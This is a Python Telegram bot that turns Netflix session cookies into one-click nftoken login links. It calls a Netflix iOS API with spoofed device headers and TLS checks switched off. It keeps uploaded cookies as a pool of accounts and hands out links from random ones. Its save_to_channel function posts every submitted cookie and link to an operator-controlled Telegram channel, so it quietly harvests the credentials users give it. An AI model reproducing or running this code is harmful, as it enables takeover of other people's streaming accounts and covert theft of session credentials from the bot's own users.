import os
import json
import re
import random
import urllib.parse
from datetime import datetime
import telebot
import requests
import time
from telebot import apihelper
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ============================================
# RAILWAY CONFIG - Environment Variable से Token लें
# ============================================
apihelper.READ_TIMEOUT = 60
apihelper.CONNECT_TIMEOUT = 60

BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN")
if not BOT_TOKEN:
    print("❌ TELEGRAM_TOKEN not found in environment variables!")
    exit(1)

CHANNEL_ID = os.environ.get("CHANNEL_ID", "-1003937881669")
WATERMARK = "github.com/harshitkamboj"
ADMIN_ID = int(os.environ.get("ADMIN_ID", "8741623856"))

COOKIE_FILE = "cookies.json"

def load_cookies():
    if os.path.exists(COOKIE_FILE):
        with open(COOKIE_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_cookies(cookies):
    with open(COOKIE_FILE, 'w', encoding='utf-8') as f:
        json.dump(cookies, f, indent=4, ensure_ascii=False)

NETFLIX_ACCOUNTS = load_cookies()

# ============================================
# SHAYARI LIST
# ============================================
SHAYARI_LIST = [
    "💫 Har mod pe milenge naye bahane,\nZindagi ke safar mein hain afsane,\nHum to chalte rahenge apni raah par,\nTum bhi muskurakar dikhao zamane.",
    "🌙 Chand ki chandni jaise khilti hai,\nHar sham nai ummid le kar aati hai,\nHumne to har din ek kahani likhi,\nTum apni kismat khud banati hai.",
    "💖 Dilon ke milne ki dastaan hai,\nHar pal mein teri pehchan hai,\nJo sachcha ho use manzil milti hai,\nBas ek nazar mohabbat ka farman hai.",
    "✨ Raatein bhi hain aur sitare bhi,\nTeri yaadon ke sahare bhi,\nHum to bas ek sapna dekhte hain,\nJismein ho teri baatein har baar bhi.",
    "🌺 Jo samandar se gehra hai,\nHar ada mein jadoo bhara hai,\nMohabbat ka har rang naya hai,\nHar ek sham tumhari kahani hai."
]

# ============================================
# NETFLIX API
# ============================================
API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

bot = telebot.TeleBot(BOT_TOKEN)

# ============================================
# COOKIE PARSING FUNCTIONS
# ============================================

def parse_netscape_cookie_line(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return {}
    
    if "\t" in line:
        parts = line.split("\t")
    else:
        parts = re.split(r'\s+', line)
    
    if len(parts) >= 7:
        return {parts[-2]: parts[-1]}
    return {}

def _decode_cookie_value(value):
    if isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except Exception:
            return value
    return value

def extract_cookie_dict(text):
    cookie_dict = {}
    
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or line.startswith("="):
            continue
        if ".netflix.com" in line:
            cookie_dict.update(parse_netscape_cookie_line(line))
    
    try:
        data = json.loads(text)
        if isinstance(data, dict):
            for key in COOKIE_KEYS:
                if key in data:
                    cookie_dict[key] = _decode_cookie_value(data[key])
    except:
        pass
    
    for key in COOKIE_KEYS:
        if key not in cookie_dict:
            match = re.search(rf"{re.escape(key)}=([^;,\s]+)", text)
            if match:
                cookie_dict[key] = _decode_cookie_value(match.group(1))
    
    return cookie_dict

def build_nftoken_link(token):
    return "https://netflix.com/?nftoken=" + token

def fetch_nftoken(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        raise ValueError("Missing NetflixId")

    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    response = requests.get(
        API_URL,
        params=QUERY_PARAMS,
        headers=headers,
        timeout=30,
        verify=False,
    )
    response.raise_for_status()

    data = response.json()
    token_data = (
        (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default")
        or {}
    )
    token = token_data.get("token")
    expires = token_data.get("expires")

    if not token:
        raise ValueError("No token found")

    if isinstance(expires, int) and len(str(expires)) == 13:
        expires //= 1000

    return token, expires

def format_expiry(expires):
    if not isinstance(expires, (int, float)):
        return "Unknown"
    try:
        return datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S")
    except:
        return str(expires)

def save_to_channel(cookie_text, nftoken_link, expires, user_id, username, account_name="Unknown"):
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    message = "📥 NEW NFToken Generated!\n\n"
    message += "👤 User: " + username + " (ID: " + str(user_id) + ")\n"
    message += "📂 Account: " + account_name + "\n"
    message += "⏰ Time: " + current_time + "\n\n"
    message += "🔗 NFToken Link:\n"
    message += "`" + nftoken_link + "`\n\n"
    message += "⏳ Expires: `" + expires + "`\n\n"
    message += "🍪 Complete Cookie:\n"
    message += "```\n" + cookie_text + "\n```\n\n"
    message += "---\n"
    message += "🔹 Generated by: @NetflixNFTBot\n"
    message += "🔹 " + WATERMARK
    
    try:
        sent_msg = bot.send_message(CHANNEL_ID, message, parse_mode='Markdown')
        return True, sent_msg.message_id
    except Exception as e:
        return False, str(e)

def get_random_account():
    cookies = load_cookies()
    if not cookies:
        return None, "No accounts found!"
    
    account_names = list(cookies.keys())
    random_account = random.choice(account_names)
    return random_account, None

def generate_random_token():
    account_name, error = get_random_account()
    if error:
        return None, error
    
    cookies = load_cookies()
    account = cookies[account_name]
    
    cookie_dict = {
        "NetflixId": account.get("NetflixId", ""),
        "SecureNetflixId": account.get("SecureNetflixId", ""),
        "nfvdid": account.get("nfvdid", "")
    }
    
    cookie_string = f"NetflixId={cookie_dict['NetflixId']}; SecureNetflixId={cookie_dict['SecureNetflixId']}; nfvdid={cookie_dict['nfvdid']}"
    
    try:
        token, expires = fetch_nftoken(cookie_dict)
        nftoken_link = build_nftoken_link(token)
        expiry_str = format_expiry(expires)
        return {
            "token": token,
            "link": nftoken_link,
            "expires": expiry_str,
            "cookie_string": cookie_string,
            "account_name": account_name
        }, None
    except Exception as e:
        return None, str(e)

# ============================================
# TELEGRAM COMMANDS
# ============================================

@bot.message_handler(commands=['start'])
def send_welcome(message):
    random_shayari = random.choice(SHAYARI_LIST)
    
    text = "😵 **NETFLIX NF TOKEN** 😵\n\n"
    text += "👑 **Owner:** ❤️ 𝐏𝐀𝐖𝐀𝐍 𝐒𝐀𝐈𝐍𝐈 ❤️\n\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    text += "📌 **Commands:**\n"
    text += "   🍪 /netflix - Random NFToken\n"
    text += "   📄 Send .txt file - Upload Cookie\n"
    text += "   📋 Send Cookie - Manual\n\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    text += "✨ **Aaj ki Shayari:** ✨\n\n"
    text += random_shayari + "\n\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    text += "📱 **Contact:** @PawanSaini\n"
    text += "⚡ **Made with ❤️ by:** 𝐏𝐀𝐖𝐀𝐍 𝐒𝐀𝐈𝐍𝐈"
    
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['netflix'])
def show_netflix_button(message):
    cookies = load_cookies()
    if not cookies:
        bot.reply_to(message, "📭 No accounts found!\n\nUpload a .txt file to add accounts.", parse_mode='Markdown')
        return
    
    markup = InlineKeyboardMarkup()
    button = InlineKeyboardButton(
        text="🌟 𝐍𝐄𝐓𝐅𝐋𝐈𝐗 🌟",
        callback_data="netflix_random"
    )
    markup.add(button)
    
    text = "🎬 **Click below to get a random NFToken:**\n\n"
    text += f"📂 **Total Accounts:** {len(cookies)}\n\n"
    text += "✨ हर बार मिलेगा एक नया Token!"
    
    bot.reply_to(message, text, parse_mode='Markdown', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.data == "netflix_random":
        bot.edit_message_text(
            "🎲 **Random Account Selected!**\n\n⏳ Generating NFToken...",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode='Markdown'
        )
        
        result, error = generate_random_token()
        
        if error:
            bot.edit_message_text(
                f"❌ **Error:** {error}\n\n💡 Please upload some cookies first!",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                parse_mode='Markdown'
            )
            bot.answer_callback_query(call.id, "Error!")
            return
        
        success_text = "✅ **NFToken Generated!** 🎉\n\n"
        success_text += f"📂 **Account:** {result['account_name']}\n"
        success_text += f"🔗 **Link:**\n`{result['link']}`\n\n"
        success_text += f"⏰ **Expires:** `{result['expires']}`\n\n"
        success_text += "📢 **Saved in Channel!**\n\n"
        success_text += "🔄 Click again for a new random token!"
        
        bot.edit_message_text(
            success_text,
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode='Markdown'
        )
        
        user_id = call.from_user.id
        username = call.from_user.username or call.from_user.first_name or "Unknown"
        
        save_to_channel(
            result['cookie_string'],
            result['link'],
            result['expires'],
            user_id,
            username,
            result['account_name']
        )
        bot.answer_callback_query(call.id, f"✅ Token from {result['account_name']}!")
    
    elif call.data == "cancel":
        bot.edit_message_text("❌ Cancelled!", chat_id=call.message.chat.id, message_id=call.message.message_id)
        bot.answer_callback_query(call.id, "Cancelled")

# ============================================
# FILE UPLOAD
# ============================================
@bot.message_handler(content_types=['document'])
def handle_document(message):
    try:
        msg = bot.reply_to(message, "📄 File Received! Processing...")
        
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        content = downloaded_file.decode('utf-8', errors='ignore')
        
        file_name = message.document.file_name
        
        cookie_dict = extract_cookie_dict(content)
        
        if not cookie_dict:
            bot.edit_message_text(
                "❌ No valid Netflix cookies found in file!\n\n"
                "💡 Make sure file contains:\n"
                "• NetflixId\n"
                "• SecureNetflixId\n"
                "• nfvdid",
                chat_id=message.chat.id,
                message_id=msg.message_id
            )
            return
        
        account_name = file_name.replace('.txt', '').replace('.cookie', '').replace('.netscape', '')
        if not account_name:
            account_name = f"File_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        cookies = load_cookies()
        cookies[account_name] = {
            "NetflixId": cookie_dict.get("NetflixId", ""),
            "SecureNetflixId": cookie_dict.get("SecureNetflixId", ""),
            "nfvdid": cookie_dict.get("nfvdid", "")
        }
        save_cookies(cookies)
        
        global NETFLIX_ACCOUNTS
        NETFLIX_ACCOUNTS = cookies
        
        token, expires = fetch_nftoken(cookie_dict)
        nftoken_link = build_nftoken_link(token)
        expiry_str = format_expiry(expires)
        
        success = "✅ **NFToken Ready!**\n\n"
        success += f"📄 **File:** {file_name}\n"
        success += f"📂 **Account:** {account_name}\n"
        success += f"🔗 **Link:**\n`{nftoken_link}`\n\n"
        success += f"⏰ **Expires:** `{expiry_str}`\n\n"
        success += "💾 **Permanently Saved!**\n"
        success += f"📌 **Total Accounts:** {len(cookies)}\n\n"
        success += "📢 **Saved in Channel!**"
        
        bot.edit_message_text(success, chat_id=message.chat.id, message_id=msg.message_id, parse_mode='Markdown')
        
        user_id = message.from_user.id
        username = message.from_user.username or message.from_user.first_name or "Unknown"
        
        save_to_channel(content, nftoken_link, expiry_str, user_id, username, account_name)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    text = message.text
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name or "Unknown"
    
    if 'NetflixId' in text or '.netflix.com' in text:
        msg = bot.reply_to(message, "⏳ Processing cookie...")
        
        try:
            cookie_dict = extract_cookie_dict(text)
            if not cookie_dict:
                bot.edit_message_text("❌ Invalid cookie format!", msg.chat.id, msg.message_id)
                return
            
            token, expires = fetch_nftoken(cookie_dict)
            nftoken_link = build_nftoken_link(token)
            expiry_str = format_expiry(expires)
            
            success = "✅ **NFToken Ready!**\n\n"
            success += "🔗 **Link:**\n`" + nftoken_link + "`\n\n"
            success += "⏰ **Expires:** `" + expiry_str + "`\n\n"
            success += "📢 **Saved in Channel!**"
            
            bot.edit_message_text(success, msg.chat.id, msg.message_id, parse_mode='Markdown')
            
            save_to_channel(text, nftoken_link, expiry_str, user_id, username, "Manual Cookie")
            
        except Exception as e:
            bot.edit_message_text("❌ Error: " + str(e), msg.chat.id, msg.message_id)
    else:
        bot.reply_to(message, 
            "🤔 Cookie nahi mili.\n\n"
            "📌 Use:\n"
            "• /netflix - Random NFToken\n"
            "• Send .txt file - Upload Cookie\n"
            "• Send Cookie - Manual\n\n"
            "Cookie: NetflixId=xxx; SecureNetflixId=xxx",
            parse_mode='Markdown'
        )

# ============================================
# BOT RUN
# ============================================
if __name__ == "__main__":
    print("🤖 Netflix NFT Bot Starting on Railway...")
    cookies = load_cookies()
    print(f"📂 Total Accounts: {len(cookies)}")
    print("📢 Channel ID: " + CHANNEL_ID)
    print("=" * 50)
    print(WATERMARK)
    print("=" * 50)
    
    while True:
        try:
            bot.infinity_polling(timeout=60)
        except Exception as e:
            print("⚠️ Error: " + str(e))
            print("🔄 Reconnecting in 10 seconds...")
            time.sleep(10)
